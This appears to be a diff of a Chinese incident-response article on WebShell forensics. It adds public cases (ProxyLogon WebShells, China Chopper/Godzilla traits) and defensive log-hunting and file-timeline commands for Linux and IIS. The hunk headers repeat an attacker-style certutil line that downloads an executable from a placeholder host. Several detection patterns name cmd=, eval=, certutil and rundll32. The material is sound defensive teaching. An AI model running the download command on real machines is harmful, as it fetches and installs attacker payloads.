@@ -281,7 +281,117 @@ certutil -urlcache -split -f http://x.x.x.x/a.exe a.exe
 
 ---
 
-## 0x08 如何把 WebShell 事件做成可交付时间线
+## 0x08 公开案例与现场命令
+
+### 1. 案例一：Exchange ProxyLogon 后的 WebShell 落地与后续凭据抓取
+
+Unit 42 在 2021 年披露的 Exchange 漏洞利用事件，是 WebShell 取证里非常经典的公开案例：
+
+- 攻击者先利用 ProxyLogon 相关漏洞
+- 在 Exchange Web 目录写入 WebShell
+- 随后通过 WebShell 执行 PowerShell
+- 继续做主机信息收集、凭据抓取和压缩外传
+
+这个案例最适合写进 WebShell 文章的原因是，它把最重要的三个阶段都展示得很清楚：
+
+1. WebShell 怎么落地
+2. WebShell 怎么被访问
+3. WebShell 之后如何演变成系统级控制
+
+公开来源：
+
+- Unit 42: [Actor Exploits Microsoft Exchange Server Vulnerabilities, Cortex XDR Blocks Harvesting of Credentials](https://unit42.paloaltonetworks.com/exchange-server-credential-harvesting/)
+
+### 2. 案例二：冰蝎 / Godzilla / China Chopper 类客户端的行为特征
+
+公开安全研究和蓝队经验里，像 `China Chopper`、`冰蝎`、`哥斯拉/Godzilla` 这类客户端的共同特征都很适合直接落进现场分析：
+
+- 文件往往很小
+- POST 请求稳定
+- 参数名短或经过编码
+- 响应体大小规律明显
+- 常伴随文件上传、命令执行、下载样本
+
+这一类虽然未必都需要特定单篇案例才能成立，但它们在实战中极具普适性，非常适合配合访问日志做快速定性。
+
+### 3. Nginx / Apache 现场排查命令
+
+#### 按可疑脚本名回查访问记录
+
+```bash
+grep -RInE 'a\.php|shell\.php|cmd\.php|1\.jpg\.php|cache\.asp' /var/log/nginx /var/log/httpd /var/log/apache2 2>/dev/null
+```
+
+#### 按 POST 和上传行为缩时间窗
+
+```bash
+grep -RIn 'POST ' /var/log/nginx /var/log/httpd /var/log/apache2 2>/dev/null | tail -n 100
+grep -RIn 'multipart/form-data' /var/log/nginx /var/log/httpd /var/log/apache2 2>/dev/null
+```
+
+#### 按时间窗回查某目录相关请求
+
+```bash
+grep '15/Jun/2026:10:3' /var/log/nginx/access.log | grep '/uploads/'
+```
+
+#### 查落地文件时间
+
+```bash
+find /var/www /usr/share/nginx/html /opt/tomcat/webapps -type f \( -name "*.php" -o -name "*.jsp" -o -name "*.aspx" -o -name "*.asp" \) -mtime -7 -ls 2>/dev/null
+stat /var/www/html/uploads/a.php 2>/dev/null
+```
+
+### 4. IIS / Windows 现场排查命令
+
+#### 查 Web 目录最近变更文件
+
+```powershell
+Get-ChildItem "C:\inetpub\wwwroot","D:\wwwroot" -Recurse -Force -ErrorAction SilentlyContinue |
+  Where-Object {$_.Extension -in ".aspx",".asp",".php",".jsp"} |
+  Sort-Object LastWriteTime -Descending |
+  Select-Object -First 100 FullName, Length, LastWriteTime
+```
+
+#### 查 IIS 日志里的可疑脚本访问
+
+```powershell
+Get-ChildItem "C:\inetpub\logs\LogFiles" -Recurse -ErrorAction SilentlyContinue |
+  Select-String -Pattern "POST .*\.aspx|POST .*\.php|cmd=|pass=|eval=|upload|multipart/form-data"
+```
+
+#### 查 WebShell 后续触发的系统命令
+
+```powershell
+$start=(Get-Date).AddDays(-3)
+Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688; StartTime=$start} |
+  Where-Object {
+    $_.Message -match 'w3wp\.exe|cmd\.exe|powershell\.exe|certutil\.exe|rundll32\.exe'
+  } |
+  Select-Object TimeCreated, Message
+```
+
+如果出现：
+
+- `w3wp.exe -> cmd.exe`
+- `w3wp.exe -> powershell.exe`
+
+那往往就是 Web 层控制已经进入系统层。
+
+### 5. 一条现场可直接执行的实战流程
+
+建议按下面顺序落地：
+
+1. 先从 Web 根目录和上传目录找近期新增脚本文件
+2. 再从访问日志按脚本名、POST、参数名、上传行为回查
+3. 再用文件时间与访问时间比对，确认“落地 -> 首次访问 -> 连续控制”
+4. 最后再查 `w3wp/httpd/nginx/php-fpm/tomcat` 后续是否拉起系统命令或下载载荷
+
+做到这一步，基本就能判断 WebShell 是入口、驻留还是残留。
+
+---
+
+## 0x09 如何把 WebShell 事件做成可交付时间线
 
 建议把事件整理为表格：
 
@@ -302,7 +412,7 @@ certutil -urlcache -split -f http://x.x.x.x/a.exe a.exe
 
 ---
 
-## 0x09 分析中的常见误区
+## 0x0A 分析中的常见误区
 
 ### 1. 扫描器报马就直接定性
 
@@ -338,7 +448,7 @@ WebShell 只是门，不是全部事件本身。
 
 ---
 
-## 0x10 总结
+## 0x0B 总结
 
 `web后门查杀` 在 `0x02` 阶段解决的是“把可疑文件找出来”；而在 `0x03` 阶段，真正需要完成的是：
 
